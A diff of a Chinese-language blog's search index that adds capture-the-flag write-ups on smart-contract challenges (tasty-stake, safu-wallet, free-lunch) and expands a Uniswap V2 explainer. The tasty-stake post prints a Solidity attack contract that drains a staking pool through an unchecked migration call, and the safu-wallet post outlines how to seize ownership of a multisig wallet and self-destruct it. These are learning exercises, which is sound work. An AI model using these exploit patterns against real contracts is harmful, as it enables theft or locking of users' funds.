@@ -4,6 +4,63 @@
   
     
     <entry>
+      <title>CTF-tasty-stake</title>
+      <link href="/2024/10/23/CTF-tasty-stake/"/>
+      <url>/2024/10/23/CTF-tasty-stake/</url>
+      
+        <content type="html"><![CDATA[<p>题目源码<a href="https://github.com/0xToshii/mr-steal-yo-crypto-ctf/tree/implement/contracts/tasty-stake">点击</a></p><p>题目要求： 有个TastyStaking 合约，该合约允许您质押 STEAK 以种植 BUTTER 代币。您的任务是从质押合约中耗尽所有 STEAK 代币。</p><p>首先这个合约是个单合约，实现的功能的挺多的，阅读了很久，看了一下它的提示：所有输入都经过了适当的验证吗？</p><p>看来又是参数有问题，来到合约最后，migrateStake合约实现的代币质押的转移</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function migrateStake(address oldStaking, uint256 amount) external &#123;</span><br><span class="line">        TastyStaking(oldStaking).migrateWithdraw(msg.sender, amount);</span><br><span class="line">        _applyStake(msg.sender, amount);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>但是关键来了。对于这个oldStaking,这个函数并没有有什么检查举动，回想前几天刚做的Safu Valut题，和它有点类似，都是没有对外部调用进行一个检查，那么这个题旧很好的解决了</p><p>攻击合约：</p><pre><code>contract Attack &#123;     address owner;     TastyStaking _tastyStaking;     Token stakingToken;     constructor(address _target, address _stakingToken)       &#123;         attacker = msg.sender;         _tastyStaking = TastyStaking(_target);          stakingToken = Token(_stakingToken);        &#125;     function migrateWithdraw(address staker, uint256 amount) externa&#123; &#125;         function pwn() external &#123;        //传入的攻击合约的地址，也就是旧地址，         _tastyStaking.migrateStake(address(this), stakingToken.balanceOf(address(_tastyStaking)));          _tastyStaking.withdrawAll(false);          stakingToken.transfer(attacker, stakingToken.balanceOf(address(this)));          &#125; &#125;这个逻辑就是，攻击合约伪装成旧抵押合约地址，取得TastyStaking合约的信任后，再执行的withdrawall函数具体：攻击者伪装成旧合约地址调用TastyStaking合约中的migrateStake函数，然后TastyStaking合约接受到转移的信号，又去旧合约中调用migrateWithdraw函数，提取被转移的代币，但是攻击合约并没有实现migrateWithdraw函数的功能，而TastyStaking合约也没有进行验证，就误以为收到转移的代币，实际没有。这样攻击合约取得了信任，然后就调用TastyStaking合约中withdrawall函数，获得了TastyStaking合约中的所有代币。</code></pre>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> CTF </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>CTF-safu-wallet</title>
+      <link href="/2024/10/23/CTF-safu-wallet/"/>
+      <url>/2024/10/23/CTF-safu-wallet/</url>
+      
+        <content type="html"><![CDATA[<p>题目源码<a href="https://github.com/0xToshii/mr-steal-yo-crypto-ctf/tree/implement/contracts/safu-wallet">点击</a>。</p><p>题目要求：这是一个多签名钱包，已经有一位顾客存入钱，然后你要将它的钱永远困住在这个钱包里</p><p>首先看到合约代码：很清晰的辨别了，SafuWallet合约是代理合约，SafuWalletLibrary合约是逻辑合约，这样分开，就好理解了<br>对于多签名钱包，我的理解就是，不止一个管理员，至少要俩个管理员就可以管理这个钱包了。</p><p>逻辑合约里有kill函数，如果能调用，这应该是最便捷的解题方式了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function kill(address _to) onlymanyowners(sha3(msg.data)) external &#123;</span><br><span class="line">    suicide(_to);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>很遗憾的是，有个<code>onlymanyowners</code>限制，这也就是多签名钱包的魅力了吧。</p><p>看到代理合约中，构造函数还是有点东西。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">constructor(address[] memory _owners, uint _required, uint _daylimit) &#123;</span><br><span class="line">   bytes memory data = abi.encodeWithSignature(</span><br><span class="line">     &quot;initWallet(address[],uint256,uint256)&quot;,</span><br><span class="line">     _owners,</span><br><span class="line">     _required,</span><br><span class="line">     _daylimit</span><br><span class="line">   );</span><br><span class="line"></span><br><span class="line">   _safuWalletLibrary.functionDelegateCall(data);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>又是熟悉的<code>delegatecall</code>,代理合约委托调用了逻辑合约里的initWallet函数，执行环境是在代理合约，改变的状态变量也是在代理合约中，也就是说在代理合约中，这个所有者是可以改变的，如果只有我们自己，那么就可以成为多签名钱包的唯一所有者，然后再调用逻辑合约里的kill函数，传入代理合约的地址，销毁它，这样就不需要其他人的所有者的同意，就可以销毁，那位存钱的人，想要取钱，是不行的。</p><p>还有一种情况就是把所有者列表都设置为空，然后再调用kill函数时就没有任何所有者确认了。</p><p>攻击思路：<br>改变所有者的列表，将他们设置为空。调用<code>safuWalletLibrary.initWallet(addresses(0), 1, type(uint).max)</code>,设置要求，只需要一个确认就可以执行操作。最后调用kill函数，即可。</p><p>个人认为：就是逻辑合约里的kill函数没有任何限制，只要所有者列表为空，或者攻击者成为了所有者，都可以调用。</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> CTF </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>CTF-free-Lunch</title>
+      <link href="/2024/10/23/CTF-free-Lunch/"/>
+      <url>/2024/10/23/CTF-free-Lunch/</url>
+      
+        <content type="html"><![CDATA[<p>题目来源：<a href="https://github.com/0xToshii/mr-steal-yo-crypto-ctf/tree/implement/contracts/free-lunch">点击</a></p><p>首先这个代币只有一个合约，还是容易理解。如果对<code>unswap V2</code>有了解的话，会更好的理解合约。发现漏洞。<br>要了解流动池<a href="https://www.binance.com/zh-CN/square/post/139279">点击</a>,</p><p>题目要求是：我们初始有俩个代币，让我们通过这个SafuMaker合约后，翻倍50，并且要耗尽这个合约的资金。</p><p>攻击流程（这道题没有思路，或者是说对流动性的了解太少了，看了测试合约，发现这个思路真的让我茅舍顿开，或者是，题目还是做少了）：</p><p>添加流动性并获得 LP 代币：</p><ul><li>攻击者首先向 SAFU-USDC 流动性池添加流动性，例如存入 10 USDC 和 10 SAFU。这一步使得攻击者获得相应数量的 LP 代币，代表他们在流动性池中的份额。</li></ul><p>创建新流动性池：</p><ul><li>攻击者使用获得的 LP 代币与 SAFU 代币创建一个新的流动性池。这一步增加了攻击者的流动性控制能力。</li></ul><p>转移 LP 代币并进行转换：</p><ul><li>攻击者将 10% 的新流动性池的 LP 代币转移到 safuMaker 合约，并调用其 convert 方法。这通常会激活一些机制，例如将 LP 代币转换为 SAFU 代币或其他奖励。</li></ul><p>代币交换：</p><ul><li>攻击者使用路由合约执行代币交换，将 SAFU 代币转换为 SAFU-Pair LP 代币。这一步骤允许攻击者利用价格差异获取更多的 LP 代币。</li></ul><p>移除流动性并提取资产：</p><ul><li>攻击者移除流动性池中的所有资产，这会将他们的 LP 代币转换为基础的 USDC 和 SAFU 代币。<br>由于在流动性池中不断进行交易、提供流动性以及获取奖励，攻击者的最终余最终余额大幅增加。</li></ul><p>攻击者成功的关键在于对流动性池机制的利用，通过不断添加流动性、转移 LP 代币和进行代币交换，攻击者能够有效增加其代币余额，最终实现经济利益的获取。</p><p>个人认为就像无中生有一样，更像一种欺骗，不过这样确实也能获利</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> CTF </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>CTF-game-assets</title>
       <link href="/2024/10/22/CTF-game-assets/"/>
       <url>/2024/10/22/CTF-game-assets/</url>
@@ -625,7 +682,7 @@
       <link href="/2024/08/06/uniswap-V2/"/>
       <url>/2024/08/06/uniswap-V2/</url>
       
-        <content type="html"><![CDATA[<h1 id="Uniswap-V2"><a href="#Uniswap-V2" class="headerlink" title="Uniswap V2"></a>Uniswap V2</h1><p><strong>Uniswap</strong>是一种流行的去中心化交易所 (DEX)协议，允许用户将任何 ERC20 代币交换为另一种代币，提供流动性以赚取费用，并访问以太坊区块链上的价格预言机。 而Uniswap V2具有更强大的功能，如下：</p><ul><li>它允许任何的ERC20代币与其他的ERC20代币配对，无需ETH作为中介，这使得流动性池更加多样化和高效，并为交易者提供更好的价格。 就是一种代币可与其他的代币转化，方便很多</li><li>Uniswap V2 实施了一种新颖的机制，可实现高度去中心化且抗操纵的链上价格供给。 这是通过在每个区块开始时测量两种资产的相对价格并随着时间的推移积累历史数据来实现的。 这允许外部智能合约查询任何时间间隔内任何货币对的时间加权平均价格（TWAP），同时将天然气成本和预言机风险降至最低。</li><li>Uniswap V2 支持一种称为闪电互换的新型交易，用户可以从池中接收任意数量的任何资产，并在链上的其他地方使用它，只要他们在交易结束时偿还该金额并支付费用即可。 交易。 这为套利、保证金交易、抵押品互换等开辟了新的可能性。</li></ul><p>同时它也有很多好处：</p><ul><li>低费用：Uniswap V2 对每笔交易收取 0.3% 的固定费用，该费用由所有流动性提供者按其在池中的权益比例分配。 该费用低于大多数中心化交易所和其他 DEX 协议，这使得 Uniswap V2 成为中小额交易的有吸引力的选择。</li><li>高流动性：Uniswap V2 利用以太坊及其庞大的 ERC20 代币生态系统的网络效应，为任何代币对提供高流动性。 任何人都可以通过提供一定数量的两种代币来创建新的货币对或加入现有的货币对，从而增加池的深度和可用性。 此外，Uniswap V2 采用自动做市商（AMM）模型，根据供需情况调整价格，确保任何交易规模始终有足够的流动性。</li><li>无许可访问：Uniswap V2 是<strong>完全去中心化和非托管的</strong>，这意味着任何人都可以使用它，而无需注册帐户、验证身份或信任第三方使用其资金。 用户可以完全控制自己的资产，可以随时进行交易或提供流动性，而无需担心停机、审查或黑客攻击。</li><li>透明定价：Uniswap V2 采用简单透明的定价机制，由恒定乘积公式和矿池当前准备金余额决定。 用户可以轻松计算他们将收到或支付任何交易的确切代币数量，没有任何隐藏费用或滑点。 用户还可以根据池的历史数据访问任何货币对的可靠且无需信任的价格预言机。</li></ul><p>要使用Uniswap V2可在<a href="https://uniswap.org/">官网</a>上访问,可以自己创建一个Uniswap钱包，一定要记住<strong>私钥</strong></p>]]></content>
+        <content type="html"><![CDATA[<h1 id="Uniswap-V2"><a href="#Uniswap-V2" class="headerlink" title="Uniswap V2"></a>Uniswap V2</h1><p><strong>Uniswap</strong>是一种流行的去中心化交易所 (DEX)协议，允许用户将任何 ERC20 代币交换为另一种代币，提供流动性以赚取费用，并访问以太坊区块链上的价格预言机。 而Uniswap V2具有更强大的功能，如下：</p><ul><li>它允许任何的ERC20代币与其他的ERC20代币配对，无需ETH作为中介，这使得流动性池更加多样化和高效，并为交易者提供更好的价格。 就是一种代币可与其他的代币转化，方便很多</li><li>Uniswap V2 实施了一种新颖的机制，可实现高度去中心化且抗操纵的链上价格供给。 这是通过在每个区块开始时测量两种资产的相对价格并随着时间的推移积累历史数据来实现的。 这允许外部智能合约查询任何时间间隔内任何货币对的时间加权平均价格（TWAP），同时将天然气成本和预言机风险降至最低。</li><li>Uniswap V2 支持一种称为闪电互换的新型交易，用户可以从池中接收任意数量的任何资产，并在链上的其他地方使用它，只要他们在交易结束时偿还该金额并支付费用即可。 交易。 这为套利、保证金交易、抵押品互换等开辟了新的可能性。</li></ul><p>每个Uniswap智能合约或一对智能合约都管理由两个ERC-20代币的储备组成的流动资金池。</p><p>同时它也有很多好处：</p><ul><li>低费用：Uniswap V2 对每笔交易收取 0.3% 的固定费用，该费用由所有流动性提供者按其在池中的权益比例分配。 该费用低于大多数中心化交易所和其他 DEX 协议，这使得 Uniswap V2 成为中小额交易的有吸引力的选择。</li><li>高流动性：Uniswap V2 利用以太坊及其庞大的 ERC20 代币生态系统的网络效应，为任何代币对提供高流动性。 任何人都可以通过提供一定数量的两种代币来创建新的货币对或加入现有的货币对，从而增加池的深度和可用性。 此外，Uniswap V2 采用自动做市商（AMM）模型，根据供需情况调整价格，确保任何交易规模始终有足够的流动性。</li><li>无许可访问：Uniswap V2 是<strong>完全去中心化和非托管的</strong>，这意味着任何人都可以使用它，而无需注册帐户、验证身份或信任第三方使用其资金。 用户可以完全控制自己的资产，可以随时进行交易或提供流动性，而无需担心停机、审查或黑客攻击。</li><li>透明定价：Uniswap V2 采用简单透明的定价机制，由恒定乘积公式和矿池当前准备金余额决定。 用户可以轻松计算他们将收到或支付任何交易的确切代币数量，没有任何隐藏费用或滑点。 用户还可以根据池的历史数据访问任何货币对的可靠且无需信任的价格预言机。</li></ul><p>要使用Uniswap V2可在<a href="https://uniswap.org/">官网</a>上访问,可以自己创建一个Uniswap钱包，一定要记住<strong>私钥</strong></p><p>流动性提供者的结构和合约之间的交互涉及多个概念和机制，以下是详细的解释：</p><h1 id="流动性提供者的结构"><a href="#流动性提供者的结构" class="headerlink" title="流动性提供者的结构"></a>流动性提供者的结构</h1><ol><li><p><strong>流动性提供者（LP）</strong>：</p><ul><li>流动性提供者是向去中心化交易所（DEX）提供资产的用户，以便交易者可以在该平台上进行交易。</li><li>LP 将两种代币（例如 USDC 和 SAFU）存入流动性池，作为回报，他们会获得流动性池代币（LP 代币），这些代币代表他们在池中的份额。</li></ul></li><li><p><strong>流动性池</strong>：</p><ul><li>流动性池是智能合约，存储了两种代币，允许用户以自动化方式进行交易。</li><li>交易者在池中买入或卖出代币，池中的资产根据交易的供需情况进行调整。</li></ul></li><li><p><strong>流动性池代币（LP 代币）</strong>：</p><ul><li>当用户提供流动性时，会获得相应的 LP 代币，表示他们在流动性池中的份额。</li><li>LP 代币可以用于其他操作，比如质押、获取奖励或进行再投资。</li></ul></li></ol><h3 id="合约之间的交互"><a href="#合约之间的交互" class="headerlink" title="合约之间的交互"></a>合约之间的交互</h3><ol><li><p><strong>流动性添加</strong>：</p><ul><li>LP 通过调用路由合约（例如 Uniswap 的 Router 合约）进行流动性添加。</li><li>路由合约会将 LP 的代币存入流动性池合约，并铸造 LP 代币。</li></ul></li><li><p><strong>交易</strong>：</p><ul><li>当交易者进行交易时，他们通过路由合约交换代币。路由合约会调用流动性池合约来更新池中的资产。</li><li>交易的执行会根据预设的算法（如自动做市商算法）调整池中代币的比例。</li></ul></li><li><p><strong>流动性移除</strong>：</p><ul><li>LP 可以选择移除他们的流动性，通过调用路由合约并指定 LP 代币数量。</li><li>路由合约会验证 LP 代币的有效性，并将相应的基础代币返回给 LP。</li></ul></li><li><p><strong>费用和奖励</strong>：</p><ul><li>每笔交易都会产生一定的交易费用，这些费用会分配给流动性提供者，作为他们提供流动性的奖励。</li><li>LP 代币也可以用于其他合约（例如收益农场或流动性挖矿合约），进一步增加收益。</li></ul></li></ol><h3 id="示例流程"><a href="#示例流程" class="headerlink" title="示例流程"></a>示例流程</h3><p>假设一个用户（LP）希望在 Uniswap 上提供流动性：</p><ol><li><p><strong>流动性添加</strong>：</p><ul><li>用户决定存入 1000 USDC 和 1 SAFU 代币。</li><li>调用 <code>addLiquidity</code> 函数，将代币发送到 Uniswap 的 Router 合约。</li><li>Router 合约会向流动性池合约转移代币，并返回相应的 LP 代币。</li></ul></li><li><p><strong>进行交易</strong>：</p><ul><li>用户或其他人可以在 Uniswap 上进行代币交换。</li><li>Router 合约会找到最佳路径并调用流动性池合约来执行交换。</li></ul></li><li><p><strong>流动性移除</strong>：</p><ul><li>用户希望取回他们的流动性，通过调用 <code>removeLiquidity</code>。</li><li>Router 合约会验证 LP 代币，并返回用户存入的相应数量的代币。</li></ul></li><li><p><strong>获得交易费用</strong>：</p><ul><li>交易过程中产生的手续费会根据用户在流动性池中的份额自动分配给他们。</li></ul></li></ol><h3 id="攻击者如何利用这些结构"><a href="#攻击者如何利用这些结构" class="headerlink" title="攻击者如何利用这些结构"></a>攻击者如何利用这些结构</h3><p>攻击者可以利用 LP 代币的流动性和合约之间的交互来执行攻击，例如：</p><ul><li><strong>通过高频交易</strong>：利用流动性池中的不平衡，进行高频交易来获利。</li><li><strong>利用价格操控</strong>：通过添加或移除流动性来操控价格，进而影响市场。</li><li><strong>奖励套利</strong>：转移 LP 代币到其他合约（例如收益农场）以获得额外奖励。</li></ul><p>这种合约之间的交互和流动性提供者的结构使得去中心化交易所能够高效运行，但同时也为攻击者提供了潜在的攻击向量。</p>]]></content>
       
       
       
